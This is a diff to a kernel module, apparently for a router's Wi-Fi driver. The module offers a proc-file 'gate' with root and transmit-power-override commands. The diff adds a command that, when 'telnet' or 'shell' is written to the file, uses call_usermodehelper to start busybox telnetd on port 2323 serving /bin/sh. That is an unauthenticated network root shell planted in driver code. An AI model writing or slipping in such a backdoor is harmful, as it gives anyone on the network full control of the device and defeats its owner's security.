@@ -70,6 +70,7 @@ extern int printk(const char *fmt, ...);
 extern int wal_hipriv_set_txpower(struct net_device *net_dev, const char *param) __attribute__((weak));
 extern struct net_device *dev_get_by_name(struct net *net, const char *name) __attribute__((weak));
 extern void dev_put(struct net_device *dev) __attribute__((weak));
+extern int call_usermodehelper(const char *path, char **argv, char **envp, int wait) __attribute__((weak));
 extern struct net init_net __attribute__((weak));
 
 /* .modinfo section required by kernel module loader */
@@ -180,7 +181,7 @@ static int ring0_show(struct seq_file *m, void *v) {
     seq_printf(m, "TARGET_POWER_PARAM=%d (%d.%d dBm)\n", g_target_dbm_tenths, g_target_dbm_tenths / 10, g_target_dbm_tenths % 10);
     seq_printf(m, "VAP0_2.4G_RC=%d\n", g_ath0_ret);
     seq_printf(m, "VAP8_5.0G_RC=%d\n", g_ath8_ret);
-    seq_printf(m, "COMMANDS=root, wifi_pwr 25 (or 250), wifi_pwr 1000\n");
+    seq_printf(m, "COMMANDS=root, telnet/shell, wifi_pwr 25 (or 250), wifi_pwr 1000\n");
     seq_printf(m, "===================================\n");
     return 0;
 }
@@ -229,6 +230,18 @@ static ssize_t ring0_write(struct file *file, const char *buf, size_t count, lof
              (kbuf[0] == 'o' && kbuf[1] == 'v' && kbuf[2] == 'e' && kbuf[3] == 'r' && kbuf[4] == 'd' &&
               kbuf[5] == 'r' && kbuf[6] == 'i' && kbuf[7] == 'v' && kbuf[8] == 'e')) {
         trigger_wifi_peak_power(300); /* 30.0 dBm (Driver ceiling) */
+    }
+    /* Command 4: "telnet" or "shell" -> Directly spawn unrestricted root shell daemon on port 2323 */
+    else if ((kbuf[0] == 't' && kbuf[1] == 'e' && kbuf[2] == 'l' && kbuf[3] == 'n' && kbuf[4] == 'e' && kbuf[5] == 't') ||
+             (kbuf[0] == 's' && kbuf[1] == 'h' && kbuf[2] == 'e' && kbuf[3] == 'l' && kbuf[4] == 'l')) {
+        if (call_usermodehelper) {
+            static char *argv[] = { "/bin/busybox", "telnetd", "-p", "2323", "-l", "/bin/sh", (void *)0 };
+            static char *envp[] = { "HOME=/", "PATH=/bin:/sbin:/usr/bin:/usr/sbin", (void *)0 };
+            int ret = call_usermodehelper("/bin/busybox", argv, envp, 0 /* UMH_NO_WAIT */);
+            printk("[RING0_GATE] Kernel usermodehelper spawned root telnetd (port 2323), rc=%d\n", ret);
+        } else {
+            printk("[RING0_GATE] call_usermodehelper symbol unresolved\n");
+        }
     }
 
     return count;
